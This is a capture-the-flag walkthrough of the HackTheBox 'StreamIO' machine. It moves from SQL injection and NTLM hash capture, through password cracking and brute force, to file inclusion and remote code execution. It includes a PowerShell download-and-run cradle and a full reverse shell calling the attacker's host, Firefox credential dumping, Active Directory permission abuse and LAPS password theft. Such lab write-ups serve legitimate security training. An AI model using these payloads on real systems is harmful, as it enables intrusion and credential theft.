---
title: StreamIO [Medium]
date: 2025-08-27
categories: [HackTheBox, OSEP]
tags: AD Web Windows
img_path: /assets/Images/HTB_StreamIO/logo.png
image:
  path: /assets/Images/HTB_StreamIO/logo.png
---

# StreamIO [Medium] OSEP

![image.png](/assets/Images/HTB_StreamIO/image.png)

## 🤨 Enumeration

```bash
nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.129.141.224
```

```bash
# Nmap 7.95 scan initiated Wed Aug 27 20:38:36 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.129.141.224
Increasing send delay for 10.129.141.224 from 0 to 5 due to 13 out of 32 dropped probes since last increase.
Nmap scan report for streamio.htb (10.129.141.224)
Host is up (0.91s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-27 15:09:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 3BBA52018DC9C10518012FB1E55ABBF8
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
|_SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
|_ssl-date: 2025-08-27T15:11:09+00:00; +12s from scanner time.
|_http-title: Streamio
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=8/27%Time=68AF1FB4%P=aarch64-unknown-linux-gnu%
SF:r(DNS-SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-
SF:sd\x04_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-27T15:10:26
|_  start_date: N/A
|_clock-skew: mean: 9s, deviation: 2s, median: 7s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 

```

### Port 80

Windows Default IIS Page

```bash
http://streamIO.htb
```

![image.png](/assets/Images/HTB_StreamIO/image%201.png)

### Port 443

We got a Page of “Online Movie Streaming”

```bash
https://streamio.htb/
```

![image.png](/assets/Images/HTB_StreamIO/image%202.png)

And after some subdomain fuzzing we have `watch.streamio.htb`

```bash
https://watch.streamio.htb/
```

![image.png](/assets/Images/HTB_StreamIO/image%203.png)

Back to the StreamIO page we have a list of name which we can write it down

```bash
https://streamio.htb/about.php
```

![image.png](/assets/Images/HTB_StreamIO/image%204.png)

But there is Contact Us page which is making an request which is pretty interesting

```bash
https://streamio.htb/contact.php
```

![asasdasda.png](/assets/Images/HTB_StreamIO/asasdasda.png)

We have register page we can register a user

```bash
https://streamio.htb/register.php
```

![image.png](/assets/Images/HTB_StreamIO/image%205.png)

ODD idk why we can’t login with the credentials mostly there will be an backend page of admin which can validate the user and then approve it 

![image.png](/assets/Images/HTB_StreamIO/image%206.png)

on `watch.streamio.htb` page we have a “Search for a movie”

We can try for SQLi because there may be a possibility this data is fetch or arranged why the backend SQL 

![image.png](/assets/Images/HTB_StreamIO/image%207.png)

So it is clearning the data according to our input

![image.png](/assets/Images/HTB_StreamIO/image%208.png)

if we click on Watch

![image.png](/assets/Images/HTB_StreamIO/image%209.png)

Trying to break a Statement no output that may be indication of SQL Statement is Breaked in backend

```bash
fast'-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2010.png)

Search so we can try to get the number of column used by thiss statement but

the request is blocked

```bash
abcd'order by 1--
```

![image.png](/assets/Images/HTB_StreamIO/image%2011.png)

This is a Wild Card in SQL so it return everything

```bash
%
```

![image.png](/assets/Images/HTB_StreamIO/image%2012.png)

But there is another way to get the column that is not getting blocked

```bash
fast' union select 1;-- -
```

Check it adding numbers so the number of column will be know 

At 6 we hit it

```bash
fast' union select 1,2,3,4,5,6;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2013.png)

Wen can see there are 2 and 3 reflected on the page we can reflect our data in this to place 

![image.png](/assets/Images/HTB_StreamIO/image%2014.png)

Getting the Version

```bash
q=asasa' union select 1,@@version ,3,4,5,6;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2015.png)

Before doing anything we can always try to use xp_dirtree good thing to test on windows if the backend is MSSQL

```bash
q=fast'EXEC xp_dirtree '\\10.10.14.109\share' ;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2016.png)

```bash
responder -I tun0
```

![image.png](/assets/Images/HTB_StreamIO/image%2017.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.141.224
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:2c425b837034b062:6FAB039C90CFF9B0969ECF7BF4FD95E5:01010000000000008092E95FB317DC010DF174B1D3F19AF900000000020008004F0052004700560001001E00570049004E002D00520059005700500030005A003500360035005900350004003400570049004E002D00520059005700500030005A00350036003500590035002E004F005200470056002E004C004F00430041004C00030014004F005200470056002E004C004F00430041004C00050014004F005200470056002E004C004F00430041004C00070008008092E95FB317DC0106000400020000000800300030000000000000000000000000300000015DD06DF7FF8BA46751C623ED5DD2A1508B4C9C6ED5DB13CE7316EE3E59E8160A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300039000000000000000000
```

The Domain Computer hash : ) it will not crack because it is randomly generated and it will be a long char

Checking the username

```bash
q=asasa' union select 1,user_name() ,3,4,5,6;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2018.png)

Database which we are currently using

```bash
q=asasa' union select 1,db_name() ,3,4,5,6;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2019.png)

If we just fuzz the number first 4 are the default things after 5 is the `STREAMIO` and 6 is this

streamio_backup

```bash
q=asasa' union select 1,db_name(6) ,3,4,5,6;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2020.png)

Dumping the username and passwords from the users table

```bash
q=asasa' union select 1,concat(username,':',password) ,3,4,5,6 from users;-- -
```

![image.png](/assets/Images/HTB_StreamIO/image%2021.png)

Downloading the request

```bash
curl http://view-source:https://watch.streamio.htb/search.php -o sql_dump.req
```

```bash
cat sql_dump.req | grep 'h5' | awk -F'[>:<]' '{print $3 ":" $4}' | tr -d ' '
```

![image.png](/assets/Images/HTB_StreamIO/image%2022.png)

Cracking it via hashcat and there are alot of password cracked

```bash
hashcat -m 0 --username username_hash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/Images/HTB_StreamIO/image%2023.png)

```bash
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
pain:d00f5d5217896fb7fd601412cb890830:Password@123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

![image.png](/assets/Images/HTB_StreamIO/image%2024.png)

```bash
hashcat -m 0 --username username_hash.txt  --show > cracked_usr_pass
```

we can make a username:password list because if we remember there was a login page which we can try to login with this credentials

```bash
cat cracked_usr_pass | awk -F: '{print $1":" $3}' > usr_pass
```

![image.png](/assets/Images/HTB_StreamIO/image%2025.png)

Using Hydra to bruteforce the login page because there is No WAF we can do it easily

```bash
hydra -C usr_pass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"

...<SNIP>...

[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..

...<SNIP>...

```

![image.png](/assets/Images/HTB_StreamIO/image%2026.png)

Login with the yoshihide credentials

```bash
https://streamio.htb/logout.php

login: yoshihide   password: 66boysandgirls..
```

![image.png](/assets/Images/HTB_StreamIO/image%2027.png)

We can try to access `/admin` which we can found it by running gobuster

![image.png](/assets/Images/HTB_StreamIO/image%2028.png)

## 🔱 Initial Access

We can successfully access the Admin panel

```bash
https://streamio.htb/admin/
```

![image.png](/assets/Images/HTB_StreamIO/image%2029.png)

Umm interesting there is a parameter we can try to fuzz this so

may we can found some hidden parameter 

```bash
https://streamio.htb/admin/?movie=
```

![image.png](/assets/Images/HTB_StreamIO/image%2030.png)

```bash
ffuf -k -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=02b4sgggmm306dnfl4ic4dpsnm' --fs 1678
```

![image.png](/assets/Images/HTB_StreamIO/image%2031.png)

From all of the parameter which we found debug one looks more good to us

it shows that this parameter us only for developers

```bash
https://streamio.htb/admin/?debug=
```

![image.png](/assets/Images/HTB_StreamIO/image%2032.png)

we can try ti access a file it shows ERROR

```bash
https://streamio.htb/admin/?debug=index.php
```

![image.png](/assets/Images/HTB_StreamIO/image%2033.png)

But we can try to get the same thing via php filter which is base64 encoded form

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

![image.png](/assets/Images/HTB_StreamIO/image%2034.png)

We got page `index.php`

```bash
echo 'onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFR...<SNIP>...dG1sPg==' | base64 -d > index.php
```

`index.php`

```bash
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}

// Password Leaked
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');

$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

![image.png](/assets/Images/HTB_StreamIO/image%2035.png)

```bash
feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
...<SNIP>...
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
...<SNIP>...
```

We can try to get this page too

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

```bash
echo 'onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCB...<SNIP>...DQo/Pg==' | base64 -d > master.php
```

`master.php`

```bash
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

So we can see there is a include method which can include file we can try to add your file and see can it include and interpret as the PHP code

`pain.php`

```bash
system("echo PAIN !!!")
```

```bash
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=02b4sgggmm306dnfl4ic4dpsnm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

include=http://10.10.14.109/pain.php
```

![image.png](/assets/Images/HTB_StreamIO/image%2036.png)

Yes it can ! Your Output is Reflected in the source

Adding a Reverse request which will give us a powershell reverse shell

`pain.php`

```bash
system("powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.10.14.109/rev.ps1')");
```

`rev.ps1`

```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',2004);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![image.png](/assets/Images/HTB_StreamIO/image%2037.png)

As i always get a sliver session

![image.png](/assets/Images/HTB_StreamIO/image%2038.png)

Using the sql creds which was leaked in the `index.php` source code

```bash
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

![image.png](/assets/Images/HTB_StreamIO/image%2039.png)

Dumping the data from the users table

```bash
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

![image.png](/assets/Images/HTB_StreamIO/image%2040.png)

```bash
         1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                                                                                                                 

```

```bash
cat sql_dump_int | awk -F' ' '{print $2":" $3}'
```

![image.png](/assets/Images/HTB_StreamIO/image%2041.png)

```bash
cat sql_dump_int | awk -F':' '{print $1}' > users.txt
```

Getting the hash in a file

```bash
cat sql_dump_int | awk -F':' '{print $2}' > username_pass_sql_int
```

Crack it via hashcat the mode will be MD5

```bash
hashcat -m 0 --username username_pass_sql_int /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/Images/HTB_StreamIO/image%2042.png)

```bash
389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
```

We can spray this password 

```bash
nxc smb 10.129.141.224 -u users.txt -p 'get_dem_girls2@yahoo.com' --no-bruteforce --continue-on-success
```

![image.png](/assets/Images/HTB_StreamIO/image%2043.png)

`nikk37`

```bash
net users

net user nikk37
```

![image.png](/assets/Images/HTB_StreamIO/image%2044.png)

We can login using this creds

```bash
nxc winrm 10.129.141.224 -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![image.png](/assets/Images/HTB_StreamIO/image%2045.png)

Using Evil-winrm to login

```bash
evil-winrm -i dc.streamIO.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![image.png](/assets/Images/HTB_StreamIO/image%2046.png)

Collecting Bloodhound data if you don’t want the data for community edition just remove the `-ce`

```bash
bloodhound-ce-python -c all -u nikk37 -p 'get_dem_girls2@yahoo.com' -d streamIO.htb -ns 10.129.141.224 --zip
```

### FireFox Credential Dump

After Running `winPEASEx64.exe` we see firefox is there

![image.png](/assets/Images/HTB_StreamIO/image%2047.png)

Using SharpWeb which winPEAS also recommend us to use

[https://github.com/djhohnstein/SharpWeb](https://github.com/djhohnstein/SharpWeb)

![image.png](/assets/Images/HTB_StreamIO/image%2048.png)

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history

    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
    
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

Did’nt Work

```bash
.\SharpWeb.exe all
```

![image.png](/assets/Images/HTB_StreamIO/image%2049.png)

Heading towards the Directory doing it manually with a python tool

```bash
cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles
```

```bash
tree .
```

![image.png](/assets/Images/HTB_StreamIO/image%2050.png)

Making a zip fie for all the content for the doler

```bash
Compress-Archive br53rxeg.default-release -Destination 1.zip
```

![image.png](/assets/Images/HTB_StreamIO/image%2051.png)

Alternative Tool

[https://github.com/lclevy/firepwd.git](https://github.com/lclevy/firepwd.git)

```bash
git clone https://github.com/lclevy/firepwd.git
```

```bash
cp logins.json /opt/firepwd
```

```bash
cp key4.db /opt/firepwd
```

```bash
python3 firepwd.py
```

```bash
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

![image.png](/assets/Images/HTB_StreamIO/image%2052.png)

Got the users password which were saved in the firefox

```bash
admin:JDg0dd1s@d0p3cr3@t0r
nikk37:n1kk1sd0p3t00:)
yoshihide:paddpadd@12
JDgodd:password@12
```

Again we can try for a password spray

![image.png](/assets/Images/HTB_StreamIO/image%2053.png)

```bash
cat firefox_passwords | awk -F: '{print $1}' > usr.txt
```

```bash
cat firefox_passwords | awk -F: '{print $2}' > pass.txt
```

![image.png](/assets/Images/HTB_StreamIO/image%2054.png)

Doing a passwordspray using netexec

```bash
nxc smb 10.129.141.224 -u usr.txt -p pass.txt --continue-on-success
```

![image.png](/assets/Images/HTB_StreamIO/image%2055.png)

Got JDgodd user

```bash
SMB    10.129.141.224  445    DC     [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

### WriteOwner

This user have WriteOwner to this Core Staff Group

![image.png](/assets/Images/HTB_StreamIO/image%2056.png)

Using BloodyAd to get genericAll to our user JDgodd. i am using CN name u can directly use the name also.

```bash
bloodyAD --host dc.streamio.htb -d streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'JDgodd'
```

Then adding ourself to the group

```bash
bloodyAD --host dc.streamio.htb -d streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'JDgodd'
```

![image.png](/assets/Images/HTB_StreamIO/image%2057.png)

## 💀 Priv Esc

### ReadLAPSPassword

`LAPS (Local Administrator Password Solution)` in Active Directory is a security feature that automatically manages and rotates the local administrator password on domain-joined machines. Instead of having the same local admin password across all systems (which attackers can easily abuse if one machine is compromised), LAPS ensures each machine gets a unique, randomly generated password that is securely stored in Active Directory. Authorized administrators can retrieve it when needed, and it changes automatically on a set schedule. This greatly reduces the risk of lateral movement, prevents password reuse attacks, and strengthens overall security hygiene, making it an essential control for any organization.

![image.png](/assets/Images/HTB_StreamIO/image%2058.png)

CoreStaff member can read LAPS Password
Using BloodyAD to read the Admin Password

```bash
bloodyAD --host $IP -d streamIO.htb -u "JDgodd" -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

![image.png](/assets/Images/HTB_StreamIO/image%2059.png)

Just adding to a file which it has too many special character

```bash
echo '+(2BGwmk(pt/k7' > password_admin
```

```bash
nxc smb 10.129.141.224 -u administrator -p password_admin
```

![image.png](/assets/Images/HTB_StreamIO/image%2060.png)

Using evil-winrm to read the root file

```bash
evil-winrm -i 10.129.141.224 -u 'administrator' -p '+(2BGwmk(pt/k7'
```

```bash
cat C:\Users\Martin\Desktop\root.txt
```

![image.png](/assets/Images/HTB_StreamIO/image%2061.png)

One Liner for `root.txt` and `user.txt`

```bash
nxc smb 10.129.141.224 -u Administrator -p '+(2BGwmk(pt/k7' -x 'type C:\Users\nikk37\Desktop\user.txt'
```

```bash
nxc smb 10.129.141.224 -u Administrator -p '+(2BGwmk(pt/k7' -x 'type C:\Users\Martin\Desktop\root.txt'
```

![image.png](/assets/Images/HTB_StreamIO/image%2062.png)

---

### `Author : PaiN`